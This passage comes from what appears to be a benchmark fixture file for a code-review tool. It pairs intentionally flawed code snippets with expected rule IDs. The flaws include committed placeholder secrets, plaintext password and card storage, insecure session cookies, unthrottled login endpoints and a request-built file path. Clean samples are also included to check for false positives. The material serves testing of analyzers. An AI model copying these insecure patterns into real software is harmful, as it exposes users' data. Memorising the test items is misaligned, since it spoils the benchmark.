    difficulty: "medium",
  },
  {
    id: "swdev-no-gitignore-sensitive-py",
    description: "Git-tracked sensitive files that should be ignored",
    language: "python",
    code: `# .env file committed to repository
DATABASE_URL=postgresql://admin:supersecret@prod-db.example.com:5432/maindb
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_test_FAKE_KEY_FOR_BENCHMARK_TEST
API_SECRET=my-super-secret-api-key-do-not-share`,
    expectedRuleIds: [],
    category: "software-practices",
    difficulty: "easy",
  },
  {
    id: "swdev-no-dependency-pinning-json",
    description: "package.json with unpinned dependencies using wildcards",
    language: "json",
    code: `{
  "name": "my-app",
  "dependencies": {
    "express": "*",
    "lodash": ">=4.0.0",
    "axios": "latest",
    "react": "^18",
    "mysql2": "~3"
  },
  "devDependencies": {
    "jest": "*",
    "typescript": ">=4"
  }
}`,
    expectedRuleIds: ["SWDEV-001", "DEPS-001"],
    category: "software-practices",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // DATA-SECURITY — only 5 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "data-pii-in-url-params-ts",
    description: "PII sent as URL query parameters instead of POST body",
    language: "typescript",
    code: `async function lookupUser(ssn: string, dob: string) {
  const response = await fetch(
    \`/api/users/lookup?ssn=\${ssn}&dateOfBirth=\${dob}&include=medical_records\`
  );
  return response.json();
}

async function verifyIdentity(passport: string, name: string) {
  const url = \`/api/verify?passportNumber=\${passport}&fullName=\${name}\`;
  return fetch(url);
}`,
    expectedRuleIds: ["REL-001", "SCALE-001", "COMP-001"],
    category: "data-security",
    difficulty: "easy",
  },
  {
    id: "data-unencrypted-storage-py",
    description: "Storing sensitive data in plaintext files without encryption",
    language: "python",
    code: `import json

def save_user_credentials(users):
    with open("/data/credentials.json", "w") as f:
        json.dump([{
            "username": u.username,
            "password": u.password,
            "api_key": u.api_key,
            "ssn": u.ssn,
        } for u in users], f)

def save_payment_info(payments):
    with open("/data/payments.csv", "w") as f:
        for p in payments:
            f.write(f"{p.card_number},{p.cvv},{p.expiry},{p.holder_name}\\n")`,
    expectedRuleIds: ["CYBER-001", "PERF-001", "ERR-001"],
    category: "data-security",
    difficulty: "easy",
  },
  {
    id: "data-excessive-data-exposure-ts",
    description: "API returning entire database rows including internal fields",
    language: "typescript",
    code: `app.get("/api/users/:id", async (req, res) => {
  const user = await db.query("SELECT * FROM users WHERE id = $1", [req.params.id]);
  // Returns passwordHash, ssn, internalNotes, salary, etc.
  res.json(user);
});

app.get("/api/users", async (req, res) => {
  const users = await db.query("SELECT * FROM users");
  res.json(users); // Mass data exposure
});`,
    expectedRuleIds: ["PERF-001", "COST-001", "UX-001", "API-001", "OBS-001", "DB-001"],
    category: "data-security",
    difficulty: "medium",
  },
  {
    id: "data-insecure-cookie-ts",
    description: "Setting cookies with sensitive data without secure flags",
    language: "typescript",
    code: `app.post("/login", async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  if (user) {
    res.cookie("userId", user.id);
    res.cookie("role", user.role);
    res.cookie("sessionToken", generateToken(user), { httpOnly: false });
    res.cookie("preferences", JSON.stringify(user.preferences));
    res.json({ success: true });
  }
});`,
    expectedRuleIds: ["DATA-001", "AUTH-001", "CYBER-001"],
    category: "data-security",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // OBSERVABILITY — only 5 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "obs-console-only-logging-ts",
    description: "Production service using only console.log without structured logging",
    language: "typescript",
    code: `import express from "express";

const app = express();

app.get("/api/users/:id", async (req, res) => {
  console.log("Getting user " + req.params.id);
  try {
    const user = await db.findUser(req.params.id);
    console.log("Found user: " + JSON.stringify(user));
    res.json(user);
  } catch (err) {
    console.log("Error: " + err);
    res.status(500).json({ error: "Internal error" });
  }
});

app.post("/api/orders", async (req, res) => {
  console.log("Creating order");
  const order = await db.createOrder(req.body);
  console.log("Created order " + order.id);
  res.json(order);
});

app.listen(3000, () => console.log("Server started"));`,
    expectedRuleIds: ["OBS-001"],
    category: "observability",
    difficulty: "easy",
  },
  {
    id: "obs-no-correlation-id-py",
    description: "Microservice without request correlation IDs for distributed tracing",
    language: "python",
    code: `from flask import Flask, request, jsonify
import logging

app = Flask(__name__)
logger = logging.getLogger(__name__)

@app.route("/api/orders", methods=["POST"])
def create_order():
    logger.info("Creating order")
    order = order_service.create(request.json)
    logger.info("Calling payment service")
    payment = requests.post("http://payment-svc/charge", json={"order_id": order.id, "amount": order.total})
    logger.info("Calling notification service")
    requests.post("http://notification-svc/send", json={"user_id": order.user_id, "message": "Order confirmed"})
    return jsonify(order.to_dict())`,
    expectedRuleIds: ["DATA-001", "CYBER-001", "REL-001", "SCALE-001", "COMP-001", "SEC-001"],
    category: "observability",
    difficulty: "medium",
  },
  {
    id: "obs-no-metrics-go",
    description: "Go HTTP server with no metrics collection or health endpoint",
    language: "go",
    code: `package main

import (
    "encoding/json"
    "log"
    "net/http"
)

func usersHandler(w http.ResponseWriter, r *http.Request) {
    users, err := db.GetUsers()
    if err != nil {
        log.Println("error getting users:", err)
        http.Error(w, "internal error", 500)
        return
    }
    json.NewEncoder(w).Encode(users)
}

func ordersHandler(w http.ResponseWriter, r *http.Request) {
    orders, err := db.GetOrders()
    if err != nil {
        log.Println("error getting orders:", err)
        http.Error(w, "internal error", 500)
        return
    }
    json.NewEncoder(w).Encode(orders)
}

func main() {
    http.HandleFunc("/users", usersHandler)
    http.HandleFunc("/orders", ordersHandler)
    log.Fatal(http.ListenAndServe(":8080", nil))
}`,
    expectedRuleIds: ["OBS-001", "REL-001"],
    category: "observability",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // DATABASE — only 9 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "db-no-connection-pool-ts",
    description: "Creating new database connections per request instead of using pool",
    language: "typescript",
    code: `import { Client } from "pg";

app.get("/api/users", async (req, res) => {
  const client = new Client({ connectionString: process.env.DATABASE_URL });
  await client.connect();
  const result = await client.query("SELECT * FROM users");
  await client.end();
  res.json(result.rows);
});

app.get("/api/orders", async (req, res) => {
  const client = new Client({ connectionString: process.env.DATABASE_URL });
  await client.connect();
  const result = await client.query("SELECT * FROM orders");
  await client.end();
  res.json(result.rows);
});`,
    expectedRuleIds: ["DB-001", "PERF-001"],
    category: "database",
    difficulty: "easy",
  },
  {
    id: "db-n-plus-1-query-py",
    description: "Python ORM N+1 query pattern in a loop",
    language: "python",
    code: `def get_orders_with_items():
    orders = Order.query.all()
    result = []
    for order in orders:
        items = OrderItem.query.filter_by(order_id=order.id).all()
        order_data = {
            "id": order.id,
            "total": order.total,
            "items": [{"name": item.name, "qty": item.quantity} for item in items],
        }
        result.append(order_data)
    return result`,
    expectedRuleIds: ["DB-001", "PERF-001"],
    category: "database",
    difficulty: "medium",
  },
  {
    id: "db-select-star-no-index-go",
    description: "Go database queries using SELECT * without proper indexes",
    language: "go",
    code: `package repo

import "database/sql"

func GetUserByEmail(db *sql.DB, email string) (*User, error) {
    row := db.QueryRow("SELECT * FROM users WHERE email = $1", email)
    var u User
    err := row.Scan(&u.ID, &u.Name, &u.Email, &u.Created)
    return &u, err
}

func SearchOrders(db *sql.DB, status string, from string) ([]Order, error) {
    rows, err := db.Query("SELECT * FROM orders WHERE status = $1 AND created_at > $2", status, from)
    if err != nil { return nil, err }
    defer rows.Close()
    var orders []Order
    for rows.Next() {
        var o Order
        rows.Scan(&o.ID, &o.UserID, &o.Status, &o.Total, &o.Created)
        orders = append(orders, o)
    }
    return orders, nil
}`,
    expectedRuleIds: ["DB-001"],
    category: "database",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PORTABILITY — only 6 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "porta-windows-only-paths-ts",
    description: "Hardcoded Windows-style paths that won't work on Linux/Mac",
    language: "typescript",
    code: `const CONFIG_PATH = "C:\\\\Program Files\\\\MyApp\\\\config.ini";
const LOG_DIR = "C:\\\\Users\\\\Public\\\\Logs";
const TEMP_DIR = "C:\\\\Windows\\\\Temp\\\\myapp";

function loadConfig() {
  return fs.readFileSync(CONFIG_PATH, "utf-8");
}

function writeLog(message: string) {
  fs.appendFileSync(LOG_DIR + "\\\\app.log", message + "\\n");
}`,
    expectedRuleIds: ["PORTA-001", "CLOUD-001"],
    category: "portability",
    difficulty: "easy",
  },
  {
    id: "porta-os-specific-commands-py",
    description: "Python using OS-specific shell commands instead of stdlib",
    language: "python",
    code: `import subprocess

def list_files(directory):
    result = subprocess.run(["dir", "/B", directory], capture_output=True, text=True, shell=True)
    return result.stdout.strip().split("\\n")

def kill_process(pid):
    subprocess.run(["taskkill", "/F", "/PID", str(pid)], shell=True)

def get_disk_usage():
    result = subprocess.run(["wmic", "logicaldisk", "get", "size,freespace"], capture_output=True, text=True, shell=True)
    return result.stdout`,
    expectedRuleIds: [],
    category: "portability",
    difficulty: "easy",
  },
  {
    id: "porta-registry-access-csharp",
    description: "C# code using Windows Registry for application config",
    language: "csharp",
    code: `using Microsoft.Win32;

public class AppConfig
{
    private const string RegKey = @"SOFTWARE\\MyApp\\Settings";

    public string GetSetting(string name)
    {
        using var key = Registry.LocalMachine.OpenSubKey(RegKey);
        return key?.GetValue(name)?.ToString() ?? "";
    }

    public void SetSetting(string name, string value)
    {
        using var key = Registry.LocalMachine.CreateSubKey(RegKey);
        key.SetValue(name, value);
    }
}`,
    expectedRuleIds: [],
    category: "portability",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CACHING — only 7 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "cache-repeated-db-queries-ts",
    description: "Same expensive query repeated on every request with no caching",
    language: "typescript",
    code: `app.get("/api/dashboard", async (req, res) => {
  const stats = await db.query("SELECT COUNT(*) as total, SUM(amount) as revenue FROM orders");
  const topProducts = await db.query("SELECT product_id, COUNT(*) as cnt FROM order_items GROUP BY product_id ORDER BY cnt DESC LIMIT 10");
  const activeUsers = await db.query("SELECT COUNT(DISTINCT user_id) FROM sessions WHERE last_active > NOW() - INTERVAL '5 minutes'");
  res.json({ stats: stats.rows[0], topProducts: topProducts.rows, activeUsers: activeUsers.rows[0] });
});`,
    expectedRuleIds: [],
    category: "caching",
    difficulty: "easy",
  },
  {
    id: "cache-no-http-cache-headers-py",
    description: "API responses without any cache control headers for static data",
    language: "python",
    code: `@app.route("/api/categories")
def get_categories():
    # Categories rarely change but fetched from DB every time
    categories = db.query("SELECT * FROM categories ORDER BY name")
    return jsonify(categories)

@app.route("/api/countries")
def get_countries():
    countries = db.query("SELECT * FROM countries ORDER BY name")
    return jsonify(countries)

@app.route("/api/currencies")
def get_currencies():
    currencies = db.query("SELECT * FROM currencies WHERE active = true")
    return jsonify(currencies)`,
    expectedRuleIds: ["PERF-001", "COST-001", "API-001", "OBS-001", "DB-001"],
    category: "caching",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // TESTING — only 6 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "test-no-edge-cases-ts",
    description: "Test suite that only tests happy path, no edge cases",
    language: "typescript",
    code: `describe("UserService", () => {
  it("should create a user", async () => {
    const user = await service.createUser({ name: "Alice", email: "alice@example.com" });
    expect(user.id).toBeDefined();
  });

  it("should get a user", async () => {
    const user = await service.getUser("123");
    expect(user.name).toBe("Alice");
  });

  it("should update a user", async () => {
    const user = await service.updateUser("123", { name: "Bob" });
    expect(user.name).toBe("Bob");
  });
  // No tests for: duplicate email, invalid input, not found, auth, concurrency
});`,
    expectedRuleIds: ["TEST-001"],
    category: "testing",
    difficulty: "medium",
  },
  {
    id: "test-brittle-assertions-py",
    description: "Python tests with brittle assertions tied to implementation details",
    language: "python",
    code: `def test_create_order():
    order = create_order(user_id=1, items=[{"id": 5, "qty": 2}])
    assert order.id == 42  # hardcoded expected ID
    assert str(order) == "Order(id=42, status=pending, total=29.99)"
    assert order.created_at.strftime("%Y-%m-%d") == "2026-03-08"  # date-dependent

def test_api_response():
    response = client.get("/api/users/1")
    assert response.text == '{"id":1,"name":"Alice","email":"alice@test.com","created":"2026-01-01T00:00:00Z"}'`,
    expectedRuleIds: ["TEST-001"],
    category: "testing",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // RATE-LIMITING — only 8 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "rate-no-limit-login-go",
    description: "Go login endpoint with no rate limiting allowing brute force",
    language: "go",
    code: `package auth

import (
    "encoding/json"
    "net/http"
)

func LoginHandler(w http.ResponseWriter, r *http.Request) {
    var creds struct {
        Username string \`json:"username"\`
        Password string \`json:"password"\`
    }
    json.NewDecoder(r.Body).Decode(&creds)
    user, err := db.FindUser(creds.Username)
    if err != nil || !checkPassword(user.Hash, creds.Password) {
        http.Error(w, "invalid credentials", 401)
        return
    }
    token := generateJWT(user)
    json.NewEncoder(w).Encode(map[string]string{"token": token})
}`,
    expectedRuleIds: ["CYBER-001"],
    category: "rate-limiting",
    difficulty: "medium",
  },
  {
    id: "rate-no-limit-password-reset-py",
    description: "Password reset endpoint without rate limiting",
    language: "python",
    code: `@app.route("/api/auth/reset-password", methods=["POST"])
def reset_password():
    email = request.json.get("email")
    user = User.query.filter_by(email=email).first()
    if user:
        token = generate_reset_token(user)
        send_email(email, "Password Reset", f"Reset link: https://app.example.com/reset?token={token}")
    return jsonify({"message": "If the email exists, a reset link was sent"}), 200`,
    expectedRuleIds: ["CYBER-001"],
    category: "rate-limiting",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CONFIGURATION — under 10 cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "cfg-scattered-env-no-validation-ts",
    description: "Environment variables read throughout codebase without validation",
    language: "typescript",
    code: `// In routes/users.ts
const dbUrl = process.env.DATABASE_URL;

// In routes/orders.ts
const stripeKey = process.env.STRIPE_KEY;
const webhookSecret = process.env.WEBHOOK_SECRET;

// In middleware/auth.ts
const jwtSecret = process.env.JWT_SECRET;
const tokenExpiry = parseInt(process.env.TOKEN_EXPIRY || "3600");

// In services/email.ts
const smtpHost = process.env.SMTP_HOST;
const smtpPort = parseInt(process.env.SMTP_PORT || "587");
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;`,
    expectedRuleIds: [],
    category: "configuration",
    difficulty: "easy",
  },
  {
    id: "cfg-mixed-config-sources-py",
    description: "Configuration loaded from multiple inconsistent sources",
    language: "python",
    code: `import os
import yaml
import json

# Some config from env
db_host = os.environ.get("DB_HOST", "localhost")
# Some from YAML
with open("config.yml") as f:
    yaml_config = yaml.safe_load(f)
# Some from JSON
with open("settings.json") as f:
    json_config = json.load(f)
# Some hardcoded
MAX_RETRIES = 3
TIMEOUT = 30
API_VERSION = "v2"`,
    expectedRuleIds: ["PERF-001"],
    category: "configuration",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CONCURRENCY — under 20 cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "conc-shared-map-no-mutex-go",
    description: "Go shared map accessed from multiple goroutines without mutex",
    language: "go",
    code: `package cache

var store = make(map[string]interface{})

func Set(key string, value interface{}) {
    store[key] = value
}

func Get(key string) (interface{}, bool) {
    v, ok := store[key]
    return v, ok
}

func Delete(key string) {
    delete(store, key)
}

// Called from multiple HTTP handlers concurrently`,
    expectedRuleIds: ["CONC-001"],
    category: "concurrency",
    difficulty: "easy",
  },
  {
    id: "conc-race-condition-counter-ts",
    description: "Shared counter incremented without atomicity in async context",
    language: "typescript",
    code: `let requestCount = 0;
let errorCount = 0;
let activeConnections = 0;

app.use((req, res, next) => {
  requestCount++;
  activeConnections++;
  res.on("finish", () => {
    activeConnections--;
    if (res.statusCode >= 500) errorCount++;
  });
  next();
});`,
    expectedRuleIds: ["SCALE-001"],
    category: "concurrency",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PERFORMANCE — under 16 cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "perf-sync-io-in-handler-ts",
    description: "Synchronous file I/O inside Express request handlers",
    language: "typescript",
    code: `import { readFileSync, writeFileSync, readdirSync } from "fs";
import express from "express";

const app = express();

app.get("/api/templates/:name", (req, res) => {
  const template = readFileSync(\`./templates/\${req.params.name}.html\`, "utf-8");
  const config = readFileSync("./config.json", "utf-8");
  const parsedConfig = JSON.parse(config);
  res.send(template.replace("{{title}}", parsedConfig.title));
});

app.get("/api/files", (req, res) => {
  const files = readdirSync("./uploads");
  res.json(files);
});`,
    expectedRuleIds: ["PERF-001"],
    category: "performance",
    difficulty: "easy",
  },
  {
    id: "perf-unbounded-accumulation-py",
    description: "Python accumulating all results in memory instead of streaming",
    language: "python",
    code: `def export_all_records():
    all_records = []
    offset = 0
    while True:
        batch = db.query("SELECT * FROM records LIMIT 1000 OFFSET %s", (offset,))
        if not batch:
            break
        all_records.extend(batch)
        offset += 1000
    return json.dumps(all_records)  # Could be millions of records in memory`,
    expectedRuleIds: ["CYBER-001", "DB-001", "SEC-001"],
    category: "performance",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // SCALABILITY — under 10 cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "scale-in-memory-job-queue-ts",
    description: "Job queue stored in-process memory, lost on restart",
    language: "typescript",
    code: `const jobQueue: Array<{ id: string; task: string; data: any }> = [];
const processingJobs = new Set<string>();

export function enqueueJob(task: string, data: any) {
  const id = crypto.randomUUID();
  jobQueue.push({ id, task, data });
  return id;
}

export async function processJobs() {
  while (jobQueue.length > 0) {
    const job = jobQueue.shift()!;
    processingJobs.add(job.id);
    await executeTask(job.task, job.data);
    processingJobs.delete(job.id);
  }
}`,
    expectedRuleIds: ["CONC-001", "AICS-001"],
    category: "scalability",
    difficulty: "medium",
  },
  {
    id: "scale-single-thread-heavy-compute-ts",
    description: "CPU-intensive operation blocking the Node.js event loop",
    language: "typescript",
    code: `app.post("/api/reports/generate", async (req, res) => {
  const data = await db.getReportData(req.body.filters);
  // Heavy computation on main thread blocks all other requests
  const report = generateComplexReport(data); // CPU-bound: sorting, aggregating, formatting
  const pdf = renderToPDF(report); // Also CPU-bound
  res.contentType("application/pdf").send(pdf);
});`,
    expectedRuleIds: ["SOV-001", "SEC-001"],
    category: "scalability",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // RELIABILITY — under 10 cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "rel-no-timeout-external-calls-ts",
    description: "External HTTP calls without timeout configuration",
    language: "typescript",
    code: `async function getExchangeRates() {
  const response = await fetch("https://api.exchange-rates.com/latest");
  return response.json();
}

async function sendNotification(userId: string, message: string) {
  await fetch("https://notification-service.internal/send", {
    method: "POST",
    body: JSON.stringify({ userId, message }),
  });
}

async function syncInventory() {
  const data = await fetch("https://warehouse-api.partner.com/inventory");
  return data.json();
}`,
    expectedRuleIds: ["REL-001"],
    category: "reliability",
    difficulty: "easy",
  },
  {
    id: "rel-no-graceful-shutdown-ts",
    description: "Express server with no graceful shutdown handling",
    language: "typescript",
    code: `import express from "express";

const app = express();

app.get("/api/data", async (req, res) => {
  const result = await longRunningQuery();
  res.json(result);
});

app.post("/api/process", async (req, res) => {
  await processLargeFile(req.body.fileId);
  res.json({ status: "done" });
});

app.listen(3000, () => console.log("Server started on port 3000"));
// No SIGTERM/SIGINT handler
// No connection draining
// No in-flight request tracking`,
    expectedRuleIds: ["REL-001", "CLOUD-001"],
    category: "reliability",
    difficulty: "medium",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // COST-EFFECTIVENESS — only 7 prior cases
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "cost-oversized-lambda-py",
    description: "Lambda function using maximum memory for a simple task",
    language: "python",
    code: `# serverless.yml: memorySize: 10240  (10 GB!)
def handler(event, context):
    """Simple hello world handler allocated 10GB of memory"""
    name = event.get("queryStringParameters", {}).get("name", "World")
    return {
        "statusCode": 200,
        "body": json.dumps({"message": f"Hello, {name}!"})
    }`,
    expectedRuleIds: [],
    category: "cost-effectiveness",
    difficulty: "easy",
  },
  {
    id: "cost-full-table-scan-every-request-ts",
    description: "Expensive full table scans on every API request",
    language: "typescript",
    code: `app.get("/api/search", async (req, res) => {
  // Full table scan + in-memory filtering instead of indexed query
  const allUsers = await db.query("SELECT * FROM users");
  const filtered = allUsers.rows.filter(u =>
    u.name.toLowerCase().includes(req.query.q?.toLowerCase() || "")
  );
  res.json(filtered.slice(0, 20));
});`,
    expectedRuleIds: ["COST-001", "PERF-001", "DB-001"],
    category: "cost-effectiveness",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // CLEAN CODE — FP validation for advanced patterns
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "clean-well-documented-library-ts",
    description: "TypeScript library with comprehensive JSDoc and proper structure",
    language: "typescript",
    code: `/**
 * @module StringUtils
 * String manipulation utilities for the application.
 */

/**
 * Truncates a string to the specified length, adding an ellipsis if truncated.
 * @param str - The input string to truncate
 * @param maxLength - Maximum allowed length (must be >= 3)
 * @returns The truncated string with ellipsis, or the original if shorter than maxLength
 * @example
 * truncate("Hello World", 8) // "Hello..."
 */
export function truncate(str: string, maxLength: number): string {
  if (maxLength < 3) throw new RangeError("maxLength must be >= 3");
  if (str.length <= maxLength) return str;
  return str.slice(0, maxLength - 3) + "...";
}

/**
 * Converts a string to title case.
 * @param str - The input string
 * @returns The string with each word's first letter capitalized
 */
export function toTitleCase(str: string): string {
  return str.replace(/\\b\\w/g, c => c.toUpperCase());
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["DOC", "STRUCT", "MAINT", "SWDEV"],
    category: "clean",
    difficulty: "easy",
  },
  {
    id: "clean-proper-api-design-ts",
    description: "Well-designed REST API with versioning, pagination, validation",
    language: "typescript",
    code: `import express from "express";
import { z } from "zod";

const router = express.Router();

const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  role: z.enum(["user", "admin"]).default("user"),
});

router.get("/v1/users", async (req, res) => {
  const page = Math.max(1, parseInt(req.query.page as string) || 1);
  const limit = Math.min(100, Math.max(1, parseInt(req.query.limit as string) || 20));
  const offset = (page - 1) * limit;
  const [users, total] = await Promise.all([
    db.query("SELECT id, name, email FROM users LIMIT $1 OFFSET $2", [limit, offset]),
    db.query("SELECT COUNT(*) FROM users"),
  ]);
  res.set("Cache-Control", "public, max-age=60").json({
    data: users.rows,
    pagination: { page, limit, total: parseInt(total.rows[0].count) },
  });
});

router.post("/v1/users", async (req, res) => {
  const parsed = CreateUserSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ errors: parsed.error.issues });
  const user = await db.query("INSERT INTO users (name, email, role) VALUES ($1, $2, $3) RETURNING id, name, email", [parsed.data.name, parsed.data.email, parsed.data.role]);
  res.status(201).json({ data: user.rows[0] });
});

export default router;`,
    expectedRuleIds: ["API-001", "SEC-001"],
    unexpectedRuleIds: ["CYBER", "AUTH", "RATE"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-structured-logging-py",
    description: "Python service with proper structured logging and correlation",
    language: "python",
    code: `import logging
import structlog
import uuid
from flask import Flask, request, g

app = Flask(__name__)

structlog.configure(
    processors=[
        structlog.stdlib.add_log_level,
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer(),
    ],
)

logger = structlog.get_logger()

@app.before_request
def add_request_context():
    g.correlation_id = request.headers.get("X-Correlation-ID", str(uuid.uuid4()))
    g.logger = logger.bind(correlation_id=g.correlation_id, path=request.path)

@app.route("/api/orders", methods=["POST"])
def create_order():
    g.logger.info("creating_order", user_id=request.json.get("user_id"))
    order = order_service.create(request.json)
    g.logger.info("order_created", order_id=order.id)
    return jsonify(order.to_dict()), 201`,
    expectedRuleIds: ["DATA-001", "LOGPRIV-001"],
    unexpectedRuleIds: ["OBS"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-proper-error-handling-go",
    description: "Go service with comprehensive error handling and wrapping",
    language: "go",
    code: `package service

import (
    "context"
    "fmt"
    "log/slog"
)

type UserService struct {
    db     *sql.DB
    logger *slog.Logger
}

func (s *UserService) GetUser(ctx context.Context, id string) (*User, error) {
    if id == "" {
        return nil, fmt.Errorf("user id is required")
    }

    user, err := s.db.QueryRowContext(ctx, "SELECT id, name, email FROM users WHERE id = $1", id).Scan()
    if err != nil {
        if errors.Is(err, sql.ErrNoRows) {
            return nil, fmt.Errorf("user not found: %s", id)
        }
        s.logger.Error("database error", "op", "GetUser", "id", id, "error", err)
        return nil, fmt.Errorf("failed to get user %s: %w", id, err)
    }

    return user, nil
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["ERR", "CYBER", "DB", "DOC"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-concurrent-go-mutex",
    description: "Go concurrent map access properly guarded with sync.RWMutex",
    language: "go",
    code: `package cache

import "sync"

type Cache struct {
    mu    sync.RWMutex
    items map[string]interface{}
}

func NewCache() *Cache {
    return &Cache{items: make(map[string]interface{})}
}

func (c *Cache) Get(key string) (interface{}, bool) {
    c.mu.RLock()
    defer c.mu.RUnlock()
    v, ok := c.items[key]
    return v, ok
}

func (c *Cache) Set(key string, value interface{}) {
    c.mu.Lock()
    defer c.mu.Unlock()
    c.items[key] = value
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["CONC", "PERF", "SCALE"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-well-tested-module-ts",
    description: "Module with comprehensive tests covering edge cases",
    language: "typescript",
    code: `import { describe, it, expect } from "vitest";
import { calculateDiscount, formatCurrency, validateOrder } from "./pricing";

describe("calculateDiscount", () => {
  it("returns 0 for orders below threshold", () => {
    expect(calculateDiscount(49.99)).toBe(0);
  });
  it("returns 10% for orders $50-$99", () => {
    expect(calculateDiscount(50)).toBe(5);
    expect(calculateDiscount(99.99)).toBeCloseTo(9.999);
  });
  it("returns 20% for orders $100+", () => {
    expect(calculateDiscount(100)).toBe(20);
  });
  it("throws for negative amounts", () => {
    expect(() => calculateDiscount(-1)).toThrow("amount must be non-negative");
  });
  it("handles zero correctly", () => {
    expect(calculateDiscount(0)).toBe(0);
  });
});

describe("validateOrder", () => {
  it("rejects empty items", () => {
    expect(validateOrder({ items: [] })).toEqual({ valid: false, errors: ["items required"] });
  });
  it("rejects negative quantities", () => {
    expect(validateOrder({ items: [{ id: "A", qty: -1 }] })).toEqual({ valid: false, errors: ["invalid quantity"] });
  });
});`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["TEST", "SWDEV", "DOC"],
    category: "clean",
    difficulty: "easy",
  },
  {
    id: "clean-portable-path-handling-ts",
    description: "Cross-platform path handling using Node.js path module",
    language: "typescript",
    code: `import { join, resolve, basename, extname } from "path";
import { homedir, tmpdir, platform } from "os";

const DATA_DIR = resolve(process.env.DATA_DIR || join(homedir(), ".myapp", "data"));
const TEMP_DIR = join(tmpdir(), "myapp-temp");
const CONFIG_PATH = join(DATA_DIR, "config.json");

export function getUploadPath(filename: string): string {
  const safe = basename(filename);
  const ext = extname(safe);
  const name = safe.slice(0, -ext.length || undefined);
  return join(DATA_DIR, "uploads", \`\${name}-\${Date.now()}\${ext}\`);
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["PORTA", "CLOUD", "CFG"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-rate-limited-server-ts",
    description: "Express server with proper rate limiting on all routes",
    language: "typescript",
    code: `import express from "express";
import rateLimit from "express-rate-limit";
import helmet from "helmet";

const app = express();
app.use(helmet());

const generalLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100, standardHeaders: true });
const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5, standardHeaders: true });

app.use("/api/", generalLimiter);
app.use("/api/auth/", authLimiter);

app.post("/api/auth/login", async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticate(email, password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  const token = generateToken(user);
  res.cookie("token", token, { httpOnly: true, secure: true, sameSite: "strict" });
  res.json({ userId: user.id });
});

app.listen(parseInt(process.env.PORT || "3000"));`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["RATE", "AUTH", "CYBER", "FW", "CLOUD"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-privacy-aware-logging-ts",
    description: "Logging middleware that properly redacts sensitive fields",
    language: "typescript",
    code: `const SENSITIVE_FIELDS = new Set(["password", "token", "ssn", "creditCard", "cvv", "secret", "apiKey"]);

function redactSensitive(obj: Record<string, unknown>): Record<string, unknown> {
  const redacted: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(obj)) {
    if (SENSITIVE_FIELDS.has(key.toLowerCase())) {
      redacted[key] = "[REDACTED]";
    } else if (typeof value === "object" && value !== null) {
      redacted[key] = redactSensitive(value as Record<string, unknown>);
    } else {
      redacted[key] = value;
    }
  }
  return redacted;
}

app.use((req, res, next) => {
  logger.info("request", { method: req.method, path: req.path, body: redactSensitive(req.body || {}) });
  next();
});`,
    expectedRuleIds: ["DATA-001", "CYBER-002", "LOGPRIV-001"],
    unexpectedRuleIds: [],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-database-with-pool-and-index-py",
    description: "Python database access with connection pool and proper queries",
    language: "python",
    code: `from sqlalchemy import create_engine, Column, String, Integer, Index
